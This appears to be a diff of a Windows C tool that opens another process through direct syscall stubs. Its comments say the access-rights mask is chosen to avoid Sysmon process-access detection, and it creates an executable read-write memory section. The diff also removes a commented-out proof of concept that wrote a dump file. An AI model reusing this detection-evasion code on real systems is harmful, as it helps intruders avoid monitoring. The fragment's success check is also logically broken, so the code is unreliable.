@@ -268,8 +268,8 @@ int main()
 	uPid.UniqueThread = (HANDLE)0;
 
 	// A deviation from the default access right mask to avoid standard Sysmon ID_10 detection - this can be changed to suit one's needs
-	//ULONG rights = (PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION);
-	ULONG rights = (GENERIC_ALL|STANDARD_RIGHTS_ALL|DELETE);
+	ULONG rights = (PROCESS_CREATE_PROCESS | PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION);
+	//ULONG rights = (GENERIC_ALL|STANDARD_RIGHTS_ALL|DELETE);
 	printf("Access rights %x\n", rights);
 
 	const wchar_t* FunctionZWOpen = L"ZwOpenProcess10";
@@ -288,67 +288,14 @@ int main()
 
 	HANDLE SectionHandle;
 	ZwCreateSection = ZwCreateSection10;
-	NTSTATUS state = ZwCreateSection(&SectionHandle, SECTION_ALL_ACCESS, NULL, NULL, PAGE_EXECUTE_READ, SEC_IMAGE, hProcess);
+	NTSTATUS state = ZwCreateSection(&SectionHandle, SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE, NULL, NULL, PAGE_EXECUTE_READWRITE, SEC_COMMIT,NULL);
 	printf("ZwCreateSection status %p\n", SectionHandle);
 
-	if (status)
+	if (!state == STATUS_SUCCESS)
 	{
 		ErrorExit(LFunctionZwCreateSection);
 	}
-
-
-	/*
-	*******************Initial POC test stop here**************************
 	
-
-	//Alias NtCreateFile to our assembly code for this version of Windows 10
-	NtCreateFile = &NtCreateFile10;
-	
-	//More string messy string handling
-	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
-		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlInitUnicodeString");
-
-	WCHAR FileName[50] = L"\\??\\C:\\Users\\Borg\\Desktop\\testing.bin";
-	UNICODE_STRING uFileName;
-	RtlInitUnicodeString(&uFileName, FileName);  //Finally a unicode string
-	 
-	//wprintf(L"	[+] Dump %wZ", uFileName);
-	
-	//Initialize the input/output variables for the call to CreateFile
-	NTSTATUS status;
-	HANDLE hDumpFile = NULL;
-	IO_STATUS_BLOCK IoStatusBlock;
-	ZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
-	OBJECT_ATTRIBUTES FileObjectAttributes;
-	InitializeObjectAttributes (&FileObjectAttributes, &uFileName, OBJ_CASE_INSENSITIVE	, NULL, NULL);
-
-	//Call NtCreateFile and see if it works????
-	status = NtCreateFile(&hDumpFile, FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock,0 , FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE,FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
-
-	//Here we go again in MS string hell
-	const wchar_t* FunctionNt = L"NtCreateFile10";
-	LPTSTR LFunctionNt = (LPTSTR)FunctionNt;
-
-
-	if ((hDumpFile == INVALID_HANDLE_VALUE) | (hDumpFile==0))
-	{
-		ErrorExit(LFunctionNt);
-	} 
-
-	char str[] = "Test string";
-	DWORD bytesWritten;
-	bool result = WriteFile(hDumpFile, str, strlen(str), &bytesWritten, NULL);
-
-
-	//Here we go again in MS string hell
-	const wchar_t* Function = L"WriteFile";
-	LPTSTR LFunction = (LPTSTR)Function;
-
-	if (!result)
-	{
-		ErrorExit(LFunction);
-	}*/	
-
 }
 
 
